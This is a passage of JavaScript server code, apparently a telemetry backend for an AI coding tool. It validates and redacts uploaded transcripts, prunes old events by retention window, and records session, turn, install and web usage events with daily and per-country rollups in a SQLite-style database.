    console.error("transcript upload failed", err?.message || err);
    return jsonResponse({ error: "Internal error" }, 500, cors);
  }
  return jsonResponse({ ok: true, upload_id: body.upload_id }, 200, cors);
}

function validateTranscript(body) {
  if (!body || body.event !== "transcript") return "Invalid transcript event";
  if (!UUID_RE.test(body.id || "") || !UUID_RE.test(body.upload_id || "")) {
    return "Invalid transcript identifier";
  }
  if (body.consent_version !== 1) return "Unsupported consent version";
  if (!Number.isInteger(body.schema_version) || body.schema_version < 1) {
    return "Invalid schema version";
  }
  if (typeof body.version !== "string" || !body.version) return "Missing version";
  if (!Array.isArray(body.messages) || body.messages.length === 0) {
    return "Transcript messages must be a non-empty array";
  }
  if (!Number.isInteger(body.message_count) || body.message_count !== body.messages.length) {
    return "Transcript message count mismatch";
  }
  if (!["normal_exit", "user_exit", "error", "unknown", "superseded"].includes(body.end_reason)) {
    return "Invalid transcript end reason";
  }
  return null;
}

const SENSITIVE_KEY_RE = /^(?:authorization|cookie|setcookie|privatekey|clientsecret)$/;

function isSensitiveKey(key) {
  const normalized = String(key).toLowerCase().replace(/[^a-z0-9]/g, "");
  return normalized.includes("apikey")
    || normalized.endsWith("token")
    || normalized.endsWith("secret")
    || normalized.includes("password")
    || SENSITIVE_KEY_RE.test(normalized);
}

function redactSecretText(text) {
  return text
    .replace(/sk-ant-(?:oat|ort)01-[A-Za-z0-9_-]{20,}/g, "[REDACTED_SECRET]")
    .replace(/sk-or-v1-[A-Za-z0-9_-]{20,}/g, "[REDACTED_SECRET]")
    .replace(/ghp_[A-Za-z0-9]{20,}/g, "[REDACTED_SECRET]")
    .replace(/github_pat_[A-Za-z0-9_]{20,}/g, "[REDACTED_SECRET]")
    .replace(/ya29\.[A-Za-z0-9._-]{20,}/g, "[REDACTED_SECRET]")
    .replace(/AIza[0-9A-Za-z_-]{20,}/g, "[REDACTED_SECRET]")
    .replace(/xox[baprs]-[A-Za-z0-9-]{10,}/g, "[REDACTED_SECRET]")
    .replace(/AKIA[0-9A-Z]{16}/g, "[REDACTED_SECRET]")
    .replace(/Bearer\s+[A-Za-z0-9._~+/=-]{20,}/gi, "Bearer [REDACTED_SECRET]")
    .replace(/eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g, "[REDACTED_SECRET]")
    .replace(/-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----[\s\S]*?-----END (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/g, "[REDACTED_SECRET]")
    .replace(/^\s*([A-Z][A-Z0-9_]*(?:API_KEY|TOKEN|SECRET|PASSWORD|COOKIE)\s*=\s*)[^\r\n]+/gim, "$1[REDACTED_SECRET]")
    .replace(/^\s*(AUTHORIZATION\s*[:=]\s*)[^\r\n]+/gim, "$1[REDACTED_SECRET]");
}

function redactSecretsInValue(value) {
  if (Array.isArray(value)) {
    for (let index = 0; index < value.length; index += 1) {
      if (typeof value[index] === "string") value[index] = redactSecretText(value[index]);
      else redactSecretsInValue(value[index]);
    }
    return;
  }
  if (!value || typeof value !== "object") return;
  for (const [key, entry] of Object.entries(value)) {
    if (isSensitiveKey(key)) {
      value[key] = "[REDACTED_SECRET]";
    } else if (typeof entry === "string") {
      value[key] = redactSecretText(entry);
    } else {
      redactSecretsInValue(entry);
    }
  }
}

function observeDbSize(result) {
  const size = result?.meta?.size_after;
  if (typeof size === "number" && size > 0) {
    lastObservedDbSizeBytes = size;
  }
  return lastObservedDbSizeBytes;
}

function isDbFullError(err) {
  const message = String(err?.message || err || "").toLowerCase();
  // D1 surfaces the cap as SQLITE_FULL ("database or disk is full") or an
  // explicit size-limit message. Keep this narrow: a false positive triggers
  // an unnecessary (rate-limited) prune, but matching e.g. "LIMIT" in SQL
  // syntax errors would prune on every malformed query.
  return (
    message.includes("sqlite_full")
    || message.includes("disk is full")
    || message.includes("database is full")
    || message.includes("exceeds the maximum size")
    || message.includes("maximum database size")
  );
}

function maybeScheduleEmergencyPrune(env, ctx) {
  if (lastObservedDbSizeBytes < D1_SOFT_LIMIT_BYTES) {
    return;
  }
  const now = Date.now();
  if (now - lastEmergencyPruneAtMs < EMERGENCY_PRUNE_COOLDOWN_MS) {
    return;
  }
  lastEmergencyPruneAtMs = now;
  if (ctx && typeof ctx.waitUntil === "function") {
    ctx.waitUntil(emergencyPrune(env));
  }
}

async function emergencyPrune(env) {
  console.error(
    `EMERGENCY PRUNE: db size ${lastObservedDbSizeBytes} bytes >= soft limit ${D1_SOFT_LIMIT_BYTES}; pruning with halved retention windows`,
  );
  await pruneOldEvents(env, { retentionScale: 0.5, maxBatches: 24 });
}

// Retention windows, in days, per event type. Children (turn_details /
// session_details) are deleted before their parent events rows to satisfy the
// FOREIGN KEY (event_id) constraints.
//
// Rationale:
// - turn_end / session_start / onboarding_step are the high-volume rows that
//   filled the database; their aggregate signal is captured in the
//   daily_active_users rollup at insert time.
// - session_end / session_crash power the headline "total users" and crash
//   metrics; keep them for 12 months per the documented retention policy.
// - install and feedback rows are tiny and act as identity/product anchors;
//   they are never pruned here.
// - web_pageview is the high-volume website row; keep a 90-day raw tail in D1
//   (matching firehose retention) and prune beyond it. web_cta_click is the
//   low-volume conversion anchor; keep 12 months. Web vitals need only a
//   30-day performance window; classified web errors remain useful for 90 days.
// - subscription_activated and account_linked are identity/revenue anchors and
//   are never pruned (like install / feedback).
const RETENTION_DAYS = {
  turn_end: 30,
  session_start: 30,
  onboarding_step: 30,
  upgrade: 60,
  auth_success: 180,
  session_end: 365,
  session_crash: 365,
  session_concurrency: 365,
  web_pageview: 90,
  web_cta_click: 365,
  web_vital: 30,
  web_error: 90,
  install_funnel: 90,
  subscription_login: 180,
  subscription_router_error: 90,
  subscription_budget_exhausted: 365,
  todo_session: 365,
  prompt_submitted: 30,
  telemetry_opt_out: 365,
  desktop_update: 365,
};

const PRUNE_BATCH_LIMIT = 10000;
const PRUNE_MAX_BATCHES_PER_RUN = 12;

async function pruneOldEvents(env, options = {}) {
  const retentionScale = options.retentionScale ?? 1;
  const maxBatches = options.maxBatches ?? PRUNE_MAX_BATCHES_PER_RUN;
  const linkageDays = Math.max(1, Math.round(90 * retentionScale));
  const linkageCutoff = `-${linkageDays} days`;
  // The conversion key is deliberately short-lived. Keep the aggregate CTA and
  // install anchors, but sever the browser <-> CLI join after 90 days.
  for (const table of ["web_details", "install_details"]) {
    try {
      await env.DB.prepare(
        `UPDATE ${table} SET conversion_id = NULL WHERE conversion_id IS NOT NULL
         AND event_id IN (
           SELECT event_id FROM events
           WHERE created_at < datetime('now', ?) AND event_id IS NOT NULL
         )`
      ).bind(linkageCutoff).run();
    } catch (err) {
      console.warn(`${table} attribution redaction failed`, err?.message || err);
    }
  }
  let batchesUsed = 0;
  for (const [eventType, days] of Object.entries(RETENTION_DAYS)) {
    const scaledDays = Math.max(1, Math.round(days * retentionScale));
    const cutoff = `-${scaledDays} days`;
    while (batchesUsed < maxBatches) {
      // Delete web_details children first (own try/catch: databases that
      // predate migration 0016 have no web_details table, and that must not
      // abort pruning of the event rows themselves).
      if (WEB_EVENTS.includes(eventType)) {
        try {
          await env.DB.prepare(
            `DELETE FROM web_details WHERE event_id IN (
               SELECT event_id FROM events
               WHERE event = ? AND created_at < datetime('now', ?) AND event_id IS NOT NULL
               LIMIT ?)`
          ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        } catch (err) {
          console.warn(`web_details prune failed for ${eventType}`, err?.message || err);
        }
      }
      if (INSTALL_FUNNEL_EVENTS.includes(eventType)) {
        try {
          await env.DB.prepare(
            `DELETE FROM install_details WHERE event_id IN (
               SELECT event_id FROM events
               WHERE event = ? AND created_at < datetime('now', ?) AND event_id IS NOT NULL
               LIMIT ?)`
          ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        } catch (err) {
          console.warn(`install_details prune failed for ${eventType}`, err?.message || err);
        }
      }
      if (eventType === "desktop_update") {
        try {
          await env.DB.prepare(
            `DELETE FROM desktop_update_details WHERE event_id IN (
               SELECT event_id FROM events
               WHERE event = ? AND created_at < datetime('now', ?) AND event_id IS NOT NULL
               LIMIT ?)`
          ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        } catch (err) {
          console.warn(`desktop_update_details prune failed`, err?.message || err);
        }
      }
      if (eventType === "todo_session") {
        try {
          await env.DB.prepare(
            `DELETE FROM todo_session_details WHERE event_id IN (
               SELECT event_id FROM events
               WHERE event = ? AND created_at < datetime('now', ?) AND event_id IS NOT NULL
               LIMIT ?)`
          ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        } catch (err) {
          console.warn("todo_session_details prune failed", err?.message || err);
        }
      }
      try {
        // Delete detail children first so the events FK never blocks the prune.
        await env.DB.prepare(
          `DELETE FROM turn_details WHERE event_id IN (
             SELECT event_id FROM events
             WHERE event = ? AND created_at < datetime('now', ?) AND event_id IS NOT NULL
             LIMIT ?)`
        ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        await env.DB.prepare(
          `DELETE FROM session_details WHERE event_id IN (
             SELECT event_id FROM events
             WHERE event = ? AND created_at < datetime('now', ?) AND event_id IS NOT NULL
             LIMIT ?)`
        ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        const result = await env.DB.prepare(
          `DELETE FROM events WHERE id IN (
             SELECT id FROM events
             WHERE event = ? AND created_at < datetime('now', ?)
             LIMIT ?)`
        ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        observeDbSize(result);
        const changes = result?.meta?.changes ?? result?.changes ?? 0;
        // Empty event families must not consume the deletion budget, or adding
        // a family permanently starves later families of retention checks.
        if (changes > 0) batchesUsed += 1;
        if (changes < PRUNE_BATCH_LIMIT) {
          break;
        }
      } catch (err) {
        console.warn(`retention prune failed for ${eventType}`, err?.message || err);
        break;
      }
    }
  }
}

async function insertConcurrencyDetails(env, body) {
  if (typeof body.event_id !== "string" || !body.event_id) return false;
  try {
    // Also run on event retries: a previous parent insert can have succeeded
    // while this detail write failed. INSERT OR IGNORE never rewrites history.
    await insertDynamic(env, "concurrency_details", concurrencyEntries(body));
    return true;
  } catch (err) {
    // A missing migration or failed detail write must not discard a valid
    // parent event. Coverage exposes missing_detail and the response exposes
    // concurrency_durable:false. Do not cache table absence across migrations.
    console.warn("concurrency detail write failed", err?.message || err);
    return false;
  }
}

async function insertEvent(env, body) {
  // usage_report is high volume (one per provider response). It is kept in
  // the firehose for per-session detail and rolled up here; no raw events row.
  if (body.event === "usage_report") {
    await recordDailyModelUsage(env, body);
    await recordCountryDaily(env, body);
    return;
  }

  const columns = await getEventColumns(env);
  const sessionDetailColumns = await getSessionDetailColumns(env);
  const turnDetailColumns = await getTurnDetailColumns(env);
  const installDetailColumns = await getInstallDetailColumns(env);
  const common = commonEventEntries(body, columns);

  if (body.event === "session_concurrency") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id], ["event", body.event], ["version", body.version],
      ["os", body.os], ["arch", body.arch], ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "todo_session") {
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ...common,
    ].filter(([name]) => columns.has(name));
    const inserted = await insertEventRow(env, body, values);
    if (inserted) {
      await insertTodoSessionDetails(env, body, await getTodoSessionDetailColumns(env));
    }
    return;
  }

  if (body.event === "discovery") {
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ...common,
    ].filter(([name]) => columns.has(name));
    const inserted = await insertEventRow(env, body, values);
    if (inserted) {
      await insertDiscoveryDetails(env, body, await getDiscoveryDetailColumns(env));
    }
    return;
  }

  if (WEB_EVENTS.includes(body.event)) {
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ...common,
    ].filter(([name]) => columns.has(name));
    const inserted = await insertEventRow(env, body, values);
    if (inserted) {
      await insertWebDetails(env, body, await getWebDetailColumns(env));
    }
    return;
  }

  if (SUBSCRIPTION_EVENTS.includes(body.event)) {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["account_id", body.account_id || null],
      ["tier", body.tier || null],
      // Subscription events reuse the generic model_start column for the
      // routed model (new event types; no historical rows are re-read).
      ["model_start", body.model || null],
      ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "install_funnel") {
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ...common,
    ].filter(([name]) => columns.has(name));
    const inserted = await insertEventRow(env, body, values);
    if (inserted) {
      await insertInstallDetails(env, body, installDetailColumns);
    }
    return;
  }

  if (body.event === "install") {
    const inserted = await insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ...common,
    ].filter(([name]) => columns.has(name)));
    if (inserted && body.conversion_id) {
      await insertInstallDetails(env, {
        ...body,
        stage: "first_run",
        outcome: "success",
        source: "cli",
      }, installDetailColumns);
    }
    return;
  }

  if (body.event === "upgrade") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["from_version", body.from_version || null],
      ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (DESKTOP_EVENTS.includes(body.event)) {
    const inserted = await insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["from_version", body.event === "desktop_active" ? null : desktopToken(body.from_version, /[^0-9A-Za-z.+_-]/g)],
      ...common,
    ].filter(([name]) => columns.has(name)));
    if (inserted && body.event === "desktop_update" && body.event_id) {
      try {
        await insertDynamic(env, "desktop_update_details", [
          ["event_id", body.event_id],
          ["install_kind", desktopToken(body.install_kind)],
          ["update_outcome", desktopToken(body.update_outcome)],
          ["update_failure_stage", desktopToken(body.update_failure_stage)],
        ]);
      } catch (err) {
        console.warn("desktop_update_details insert failed", err?.message || err);
      }
    }
    return inserted;
  }

  if (body.event === "auth_success") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["auth_provider", body.auth_provider || null],
      ["auth_method", body.auth_method || null],
      ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "onboarding_step") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["step", body.step || null],
      ["auth_provider", body.auth_provider || null],
      ["auth_method", body.auth_method || null],
      ["auth_failure_reason", body.auth_failure_reason || null],
      ["milestone_elapsed_ms", body.milestone_elapsed_ms || null],
      ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "telemetry_opt_out") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["step", body.step || "telemetry_settings"],
      ...common.filter(([name]) => name !== "session_id"),
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "feedback") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["feedback_rating", body.feedback_rating || null],
      ["feedback_reason", body.feedback_reason || null],
      ["feedback_text", body.feedback_text || null],
      ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "session_start") {
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["provider_start", body.provider_start || null],
      ["model_start", body.model_start || null],
      ["session_start_hour_utc", body.session_start_hour_utc ?? null],
      ["session_start_weekday_utc", body.session_start_weekday_utc ?? null],
      ["previous_session_gap_secs", body.previous_session_gap_secs ?? null],
      ["sessions_started_24h", body.sessions_started_24h || 0],
      ["sessions_started_7d", body.sessions_started_7d || 0],
      ["active_sessions_at_start", rawConcurrencyScalar(body.active_sessions_at_start)],
      ["other_active_sessions_at_start", rawConcurrencyScalar(body.other_active_sessions_at_start)],
      ...common,
    ];
    if (columns.has("resumed_session")) {
      values.push(["resumed_session", boolToInt(body.resumed_session)]);
    }
    return insertEventRow(env, body, values.filter(([name]) => columns.has(name)));
  }

  if (body.event === "prompt_submitted") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["turn_index", body.turn_index ?? null],
      ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "turn_end") {
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["turn_index", body.turn_index ?? null],
      ["turn_started_ms", body.turn_started_ms ?? null],
      ["turn_active_duration_ms", body.turn_active_duration_ms ?? null],
      ["idle_before_turn_ms", body.idle_before_turn_ms ?? null],
      ["idle_after_turn_ms", body.idle_after_turn_ms ?? null],
      ["input_tokens", body.input_tokens || 0],
      ["output_tokens", body.output_tokens || 0],
      ["cache_read_input_tokens", body.cache_read_input_tokens || 0],
      ["cache_creation_input_tokens", body.cache_creation_input_tokens || 0],
      ["total_tokens", body.total_tokens || 0],
      ["turn_success", boolToInt(body.turn_success)],
      ["turn_abandoned", boolToInt(body.turn_abandoned)],
      ["turn_end_reason", body.turn_end_reason || null],
      ...common,
    ].filter(([name]) => columns.has(name));
    const inserted = await insertEventRow(env, body, values);
    if (inserted) {
      await insertTurnDetails(env, body, turnDetailColumns);
    }
    return;
  }

  if (["session_end", "session_crash"].includes(body.event)) {
    const errors = body.errors || {};
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["provider_start", body.provider_start || null],
      ["provider_end", body.provider_end || null],
      ["model_start", body.model_start || null],
      ["model_end", body.model_end || null],
      ["provider_switches", body.provider_switches || 0],
      ["model_switches", body.model_switches || 0],
      ["duration_mins", body.duration_mins || 0],
      ["duration_secs", body.duration_secs || 0],
      ["turns", body.turns || 0],
      ["had_user_prompt", boolToInt(body.had_user_prompt)],
      ["had_assistant_response", boolToInt(body.had_assistant_response)],
      ["assistant_responses", body.assistant_responses || 0],
      ["first_assistant_response_ms", body.first_assistant_response_ms || null],
      ["first_tool_call_ms", body.first_tool_call_ms || null],
      ["first_tool_success_ms", body.first_tool_success_ms || null],
      ["tool_calls", body.tool_calls || 0],
      ["tool_failures", body.tool_failures || 0],
      ["executed_tool_calls", body.executed_tool_calls || 0],
      ["executed_tool_successes", body.executed_tool_successes || 0],
      ["executed_tool_failures", body.executed_tool_failures || 0],
      ["tool_latency_total_ms", body.tool_latency_total_ms || 0],
      ["tool_latency_max_ms", body.tool_latency_max_ms || 0],
      ["file_write_calls", body.file_write_calls || 0],
      ["tests_run", body.tests_run || 0],
      ["tests_passed", body.tests_passed || 0],
      ["input_tokens", body.input_tokens || 0],
      ["output_tokens", body.output_tokens || 0],
      ["cache_read_input_tokens", body.cache_read_input_tokens || 0],
      ["cache_creation_input_tokens", body.cache_creation_input_tokens || 0],
      ["total_tokens", body.total_tokens || 0],
      ["feature_memory_used", boolToInt(body.feature_memory_used)],
      ["feature_swarm_used", boolToInt(body.feature_swarm_used)],
      ["feature_web_used", boolToInt(body.feature_web_used)],
      ["feature_email_used", boolToInt(body.feature_email_used)],
      ["feature_mcp_used", boolToInt(body.feature_mcp_used)],
      ["feature_side_panel_used", boolToInt(body.feature_side_panel_used)],
      ["feature_goal_used", boolToInt(body.feature_goal_used)],
      ["feature_selfdev_used", boolToInt(body.feature_selfdev_used)],
      ["feature_background_used", boolToInt(body.feature_background_used)],
      ["feature_subagent_used", boolToInt(body.feature_subagent_used)],
      ["unique_mcp_servers", body.unique_mcp_servers || 0],
      ["session_success", boolToInt(body.session_success)],
      ["abandoned_before_response", boolToInt(body.abandoned_before_response)],
      ["session_stop_reason", body.session_stop_reason || null],
      ["agent_role", body.agent_role || null],
      ["parent_session_id", body.parent_session_id || null],
      ["agent_active_ms_total", body.agent_active_ms_total || 0],
      ["agent_model_ms_total", body.agent_model_ms_total || 0],
      ["agent_tool_ms_total", body.agent_tool_ms_total || 0],
      ["session_idle_ms_total", body.session_idle_ms_total || 0],
      ["agent_blocked_ms_total", body.agent_blocked_ms_total || 0],
      ["time_to_first_agent_action_ms", body.time_to_first_agent_action_ms ?? null],
      ["time_to_first_useful_action_ms", body.time_to_first_useful_action_ms ?? null],
      ["spawned_agent_count", body.spawned_agent_count || 0],
      ["background_task_count", body.background_task_count || 0],
      ["background_task_completed_count", body.background_task_completed_count || 0],
      ["subagent_task_count", body.subagent_task_count || 0],
      ["subagent_success_count", body.subagent_success_count || 0],
      ["swarm_task_count", body.swarm_task_count || 0],
      ["swarm_success_count", body.swarm_success_count || 0],
      ["user_cancelled_count", body.user_cancelled_count || 0],
      ["transport_https", body.transport_https || 0],
      ["transport_persistent_ws_fresh", body.transport_persistent_ws_fresh || 0],
      ["transport_persistent_ws_reuse", body.transport_persistent_ws_reuse || 0],
      ["transport_cli_subprocess", body.transport_cli_subprocess || 0],
      ["transport_native_http2", body.transport_native_http2 || 0],
      ["transport_other", body.transport_other || 0],
      ["session_start_hour_utc", body.session_start_hour_utc ?? null],
      ["session_start_weekday_utc", body.session_start_weekday_utc ?? null],
      ["session_end_hour_utc", body.session_end_hour_utc ?? null],
      ["session_end_weekday_utc", body.session_end_weekday_utc ?? null],
      ["previous_session_gap_secs", body.previous_session_gap_secs ?? null],
      ["sessions_started_24h", body.sessions_started_24h || 0],
      ["sessions_started_7d", body.sessions_started_7d || 0],
      ["active_sessions_at_start", rawConcurrencyScalar(body.active_sessions_at_start)],
      ["other_active_sessions_at_start", rawConcurrencyScalar(body.other_active_sessions_at_start)],
      ["max_concurrent_sessions", rawConcurrencyScalar(body.max_concurrent_sessions)],
      ["multi_sessioned", rawConcurrencyScalar(body.multi_sessioned)],
      ["resumed_session", boolToInt(body.resumed_session)],
      ["end_reason", body.end_reason || null],
      ["error_provider_timeout", errors.provider_timeout || 0],
      ["error_auth_failed", errors.auth_failed || 0],
      ["error_tool_error", errors.tool_error || 0],
      ["error_mcp_error", errors.mcp_error || 0],
      ["error_rate_limited", errors.rate_limited || 0],
      ...common,
    ].filter(([name]) => columns.has(name));
    const inserted = await insertEventRow(env, body, values);
    if (inserted) {
      await insertSessionDetails(env, body, sessionDetailColumns);
    }
    return;
  }
}

async function insertEventRow(env, body, entries) {
  const result = await insertDynamic(env, "events", entries);
  const inserted = wasInserted(result);
  if (inserted) {
    await recordDailyActivity(env, body);
  }
  return inserted;
}

function wasInserted(result) {
  return (result?.meta?.changes ?? result?.changes ?? 0) > 0;
}

async function insertTurnDetails(env, body, columns) {
  if (!columns || columns.size === 0 || !body.event_id || !columns.has("event_id")) {
    return;
  }
  const values = [
    ["event_id", body.event_id],
    ["turn_index", body.turn_index ?? null],
    ["turn_started_ms", body.turn_started_ms ?? null],
    ["turn_active_duration_ms", body.turn_active_duration_ms ?? null],
    ["idle_before_turn_ms", body.idle_before_turn_ms ?? null],
    ["idle_after_turn_ms", body.idle_after_turn_ms ?? null],
    ["turn_success", boolToInt(body.turn_success)],
    ["turn_abandoned", boolToInt(body.turn_abandoned)],
    ["turn_end_reason", body.turn_end_reason || null],
    ["input_tokens", body.input_tokens || 0],
    ["output_tokens", body.output_tokens || 0],
    ["total_tokens", body.total_tokens || 0],
    ["assistant_responses", body.assistant_responses || 0],
    ["first_assistant_response_ms", body.first_assistant_response_ms ?? null],
    ["first_tool_call_ms", body.first_tool_call_ms ?? null],
    ["first_tool_success_ms", body.first_tool_success_ms ?? null],
    ["first_file_edit_ms", body.first_file_edit_ms ?? null],
    ["first_test_pass_ms", body.first_test_pass_ms ?? null],
    ["tool_calls", body.tool_calls || 0],
    ["tool_failures", body.tool_failures || 0],
    ["executed_tool_calls", body.executed_tool_calls || 0],
    ["executed_tool_successes", body.executed_tool_successes || 0],
    ["executed_tool_failures", body.executed_tool_failures || 0],
    ["tool_latency_total_ms", body.tool_latency_total_ms || 0],
    ["tool_latency_max_ms", body.tool_latency_max_ms || 0],
    ["file_write_calls", body.file_write_calls || 0],
    ["tests_run", body.tests_run || 0],
    ["tests_passed", body.tests_passed || 0],
    ["feature_memory_used", boolToInt(body.feature_memory_used)],
    ["feature_swarm_used", boolToInt(body.feature_swarm_used)],
    ["feature_web_used", boolToInt(body.feature_web_used)],
    ["feature_email_used", boolToInt(body.feature_email_used)],
    ["feature_mcp_used", boolToInt(body.feature_mcp_used)],
    ["feature_side_panel_used", boolToInt(body.feature_side_panel_used)],
    ["feature_goal_used", boolToInt(body.feature_goal_used)],
    ["feature_selfdev_used", boolToInt(body.feature_selfdev_used)],
    ["feature_background_used", boolToInt(body.feature_background_used)],
    ["feature_subagent_used", boolToInt(body.feature_subagent_used)],
    ["unique_mcp_servers", body.unique_mcp_servers || 0],
    ["tool_cat_read_search", body.tool_cat_read_search || 0],
    ["tool_cat_write", body.tool_cat_write || 0],
    ["tool_cat_shell", body.tool_cat_shell || 0],
    ["tool_cat_web", body.tool_cat_web || 0],
    ["tool_cat_memory", body.tool_cat_memory || 0],
    ["tool_cat_subagent", body.tool_cat_subagent || 0],
    ["tool_cat_swarm", body.tool_cat_swarm || 0],
    ["tool_cat_email", body.tool_cat_email || 0],
    ["tool_cat_side_panel", body.tool_cat_side_panel || 0],
    ["tool_cat_goal", body.tool_cat_goal || 0],
    ["tool_cat_mcp", body.tool_cat_mcp || 0],
    ["tool_cat_other", body.tool_cat_other || 0],
    ["tool_cat_todo", body.tool_cat_todo || 0],
    ["feature_todo_used", boolToInt(body.feature_todo_used)],
    ["todo_gate_ownership_count", body.todo_gate_ownership_count || 0],
    ["todo_gate_hill_count", body.todo_gate_hill_count || 0],
    ["todo_gate_completion_count", body.todo_gate_completion_count || 0],
    ["todo_gate_spike_count", body.todo_gate_spike_count || 0],
    ["workflow_chat_only", boolToInt(body.workflow_chat_only)],
    ["workflow_coding_used", boolToInt(body.workflow_coding_used)],
    ["workflow_research_used", boolToInt(body.workflow_research_used)],
    ["workflow_tests_used", boolToInt(body.workflow_tests_used)],
    ["workflow_background_used", boolToInt(body.workflow_background_used)],
    ["workflow_subagent_used", boolToInt(body.workflow_subagent_used)],
    ["workflow_swarm_used", boolToInt(body.workflow_swarm_used)],
  ].filter(([name]) => columns.has(name));
  if (values.length > 1) {
    await insertDynamic(env, 'turn_details', values);
  }
}

async function recordDailyActivity(env, body) {
  // Country rollup covers every event family, including the ones that never
  // reach the DAU table (install, upgrade, web_pageview, ...).
  await recordCountryDaily(env, body);
  if (!["session_start", "prompt_submitted", "turn_end", "session_end", "session_crash"].includes(body.event)) {
    return;
  }

  const activityDate = new Date().toISOString().slice(0, 10);
  const meaningful = isMeaningfulLifecycleEvent(body) ? 1 : 0;
  // ci_release means the artifact was built by CI/CD, not that this execution
  // happened on a runner. Runtime automation is represented independently by
  // is_ci and CI-built official binaries still count as release usage.
  const release = ["release", "ci_release"].includes(body.build_channel) ? 1 : 0;
  const meaningfulRelease = meaningful && release ? 1 : 0;
  const isCi = boolToInt(body.is_ci);
  const sessionStartCount = body.event === "session_start" ? 1 : 0;
  const turnEndCount = body.event === "turn_end" ? 1 : 0;
  const sessionEndCount = body.event === "session_end" ? 1 : 0;
  const sessionCrashCount = body.event === "session_crash" ? 1 : 0;

  try {
    await env.DB.prepare(`
      INSERT INTO daily_active_users (
        activity_date,
        telemetry_id,
        raw_active,
        meaningful_active,
        release_active,
        meaningful_release_active,
        session_start_count,
        turn_end_count,
        session_end_count,
        session_crash_count,
        ci_active,
        last_is_ci,
        last_build_channel,
        last_country
      ) VALUES (?, ?, 1, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
      ON CONFLICT(activity_date, telemetry_id) DO UPDATE SET
        last_seen_at = datetime('now'),
        raw_active = 1,
        meaningful_active = MAX(meaningful_active, excluded.meaningful_active),
        release_active = MAX(release_active, excluded.release_active),
        meaningful_release_active = MAX(meaningful_release_active, excluded.meaningful_release_active),
        session_start_count = session_start_count + excluded.session_start_count,
        turn_end_count = turn_end_count + excluded.turn_end_count,
        session_end_count = session_end_count + excluded.session_end_count,
        session_crash_count = session_crash_count + excluded.session_crash_count,
        ci_active = MAX(ci_active, excluded.ci_active),
        last_is_ci = excluded.last_is_ci,
        last_build_channel = COALESCE(excluded.last_build_channel, daily_active_users.last_build_channel),
        last_country = COALESCE(excluded.last_country, daily_active_users.last_country)
    `).bind(
      activityDate,
      body.id,
      meaningful,
      release,
      meaningfulRelease,
      sessionStartCount,
      turnEndCount,
      sessionEndCount,
      sessionCrashCount,
      isCi,
      isCi,
      body.build_channel || null,
      body.country || null,
    ).run();
  } catch (err) {
    // Older databases may not have the rollup migration yet. Do not reject the
    // canonical event insert, because raw events remain the source of truth.
    console.warn("daily activity rollup failed", err?.message || err);
  }
}

// Durable per-day country x event counts. Aggregate only (no telemetry_id), so
// it survives retention pruning and cannot be used to profile an individual.
async function recordCountryDaily(env, body) {
  if (!body.country) {
    return;
  }
  const activityDate = new Date().toISOString().slice(0, 10);
  try {
    await env.DB.prepare(`
      INSERT INTO country_daily (activity_date, country, event, is_ci, event_count)
      VALUES (?, ?, ?, ?, 1)
      ON CONFLICT(activity_date, country, event, is_ci) DO UPDATE SET
        event_count = event_count + 1,
        last_seen_at = datetime('now')
